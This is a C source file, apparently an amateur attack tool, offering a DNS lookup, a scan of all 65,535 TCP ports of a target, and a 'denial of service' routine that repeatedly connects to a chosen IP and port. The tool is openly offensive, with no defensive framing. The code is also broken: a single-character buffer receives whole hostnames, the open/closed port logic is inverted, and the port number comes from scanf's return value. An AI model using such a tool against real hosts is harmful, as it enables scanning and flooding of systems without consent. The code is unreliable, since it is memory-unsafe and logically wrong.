//This Program does a DNS resolver, a ports scans and Denieal of service

#include <stdio.h>//uses to get input.
#include <netdb.h>//uses to work with socket.
#include <arpa/inet.h> // uses to work with InetNtoa method;
#include <sys/socket.h>// uses to work with socket.
#include <unistd.h>// uses to close the socket.


// Rosolves DNS.
void DNSResolver(char *target)
{
    struct hostent *targetDomain = gethostbyname(target);
    printf("IP: %s\n", inet_ntoa(*((struct in_addr *)targetDomain->h_name)));
}

//Port Scan.
void PortScan(char *target)
{
    int mySocket;
    int connectMySocket;
    struct sockaddr_in targetSocket;

    for (int port=0;port<65535;port++)
    {
        mySocket = socket(AF_INET,SOCK_STREAM,0);
        targetSocket.sin_family = AF_INET;
        targetSocket.sin_addr.s_addr = inet_addr(target);
        targetSocket.sin_port = htons(port);
        connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
        
        if(connectMySocket)
        {
            printf("The port %d is opened.\n",port);
            close(mySocket);
            close(connectMySocket);
        }
        else
        {
            printf("The port %d is closed.\n",port);
            close(mySocket);
            close(connectMySocket);
        }
    }
}

// DOS to a target
void DenialOfService(char *target,  int port)
{
    
    int mySocket;
    mySocket = socket(AF_INET,SOCK_STREAM,0);
    int connectMySocket;
    struct sockaddr_in targetSocket;
    targetSocket.sin_family = AF_INET;
    targetSocket.sin_addr.s_addr = inet_addr(target);
    targetSocket.sin_port = htons(port);
    
    
    while (port != 0)

    {
   
        connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
        printf("The service is soffering DoS");

    }

}

void main (void)
{
   char target;
   int input;
   printf ("type 1 to DNS resolver, 2 to prot scan and 3 to DoNS atack ");
   scanf("%i",&input);

   
   switch (input)
    {
        
        case 1:
            printf("Type a target - eg: businesscorp.com.");
            scanf("%s",&target);
            DNSResolver(&target);
            break;
       
        case 2:
            printf("Type a target - eg: IP adress.");
            scanf("%s",&target);
            PortScan(&target);
            break;
        case 3:
            printf("Type a target  - eg: IP adress.");
            scanf("%s",&target);
            printf("Type a port- eg: IP 8080");
            int port = scanf("%i",&port);
            scanf("%s",&target);
            DenialOfService(&target,port);
            break;
        default:
            printf("Please, you must type one number of menu");
            break;      
    }

}